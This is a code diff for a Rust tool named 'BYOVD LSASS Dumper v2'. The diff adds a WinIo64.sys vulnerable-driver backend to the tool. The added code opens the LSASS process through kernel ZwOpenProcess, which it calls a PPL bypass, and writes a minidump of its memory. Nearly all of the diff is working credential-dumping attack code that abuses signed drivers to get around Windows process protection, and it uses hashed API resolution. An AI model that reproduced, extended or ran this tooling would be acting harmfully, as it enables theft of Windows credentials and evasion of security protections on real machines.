@@ -15,6 +15,7 @@ mod resolver;
 mod seclogon;
 mod sfdrv64;
 mod syscall;
+mod winio64;
 
 use clap::{Parser, ValueEnum};
 use std::process;
@@ -38,6 +39,9 @@ enum DriverType {
     /// sfdrvx64.sys — SpeedFan physical memory DM_KernelSyscall
     #[value(name = "sfdrv")]
     Sfdrv,
+    /// WinIo64.sys — Section-based physical memory DM_KernelSyscall
+    #[value(name = "winio")]
+    Winio,
 }
 
 #[derive(Parser)]
@@ -83,6 +87,7 @@ fn main() {
     let backend_name = match cli.driver_type {
         DriverType::Viragt => "viragt64 (virtual memory IOCTL)",
         DriverType::Sfdrv => "sfdrvx64 (DM_KernelSyscall SpeedFan)",
+        DriverType::Winio => "WinIo64 (DM_KernelSyscall Section-map)",
     };
 
     println!("[*] BYOVD LSASS Dumper v2");
@@ -147,6 +152,7 @@ fn main() {
     let dump_result = match cli.driver_type {
         DriverType::Viragt => run_viragt_flow(&cli, &api, lsass_pid, &driver_guard),
         DriverType::Sfdrv => run_sfdrv_flow(&cli, &api, lsass_pid),
+        DriverType::Winio => run_winio_flow(&cli, &api, lsass_pid),
     };
 
     // ─── Cleanup ──────────────────────────────────────────────────────
@@ -301,6 +307,41 @@ fn run_sfdrv_flow(cli: &Cli, api: &resolver::ApiResolver, lsass_pid: u32) -> Res
     let engine = sfdrv64::DmEngine::new(api)
         .map_err(|e| format!("Failed to initialize sfdrvx64 engine: {}", e))?;
     println!("[+] sfdrvx64 DM_KernelSyscall engine ready");
+
+    println!("[*] Step 3: Opening LSASS via kernel ZwOpenProcess (PPL bypass)...");
+    let lsass_handle = engine
+        .open_process(lsass_pid)
+        .map_err(|e| format!("Kernel ZwOpenProcess failed: {}", e))?;
+    println!("[+] LSASS handle acquired via kernel: {:?}", lsass_handle);
+
+    println!("[*] Step 4: Building minidump via NtReadVirtualMemory...");
+    let dump_result =
+        minidump::create_minidump(api, lsass_handle, lsass_pid, &cli.output, cli.encrypt);
+
+    unsafe {
+        let fn_close: unsafe extern "system" fn(
+            windows::Win32::Foundation::HANDLE,
+        ) -> windows::Win32::Foundation::BOOL =
+            std::mem::transmute(api.k32(resolver::HASH_CLOSE_HANDLE).unwrap());
+        let _ = fn_close(lsass_handle);
+    }
+
+    drop(engine);
+    dump_result
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// WinIo64 flow: DM_KernelSyscall via WinIo64.sys (Section-based mapping)
+// ═══════════════════════════════════════════════════════════════════════════════
+
+fn run_winio_flow(cli: &Cli, api: &resolver::ApiResolver, lsass_pid: u32) -> Result<u64, String> {
+    println!("[*] DM_KernelSyscall mode (WinIo64 — Section mapping)");
+    println!("[*] All memory operations will execute in kernel mode\n");
+
+    println!("[*] Step 2: Initializing WinIo64 DM_KernelSyscall engine...");
+    let engine = winio64::DmEngine::new(api)
+        .map_err(|e| format!("Failed to initialize WinIo64 engine: {}", e))?;
+    println!("[+] WinIo64 DM_KernelSyscall engine ready");
 
     println!("[*] Step 3: Opening LSASS via kernel ZwOpenProcess (PPL bypass)...");
     let lsass_handle = engine
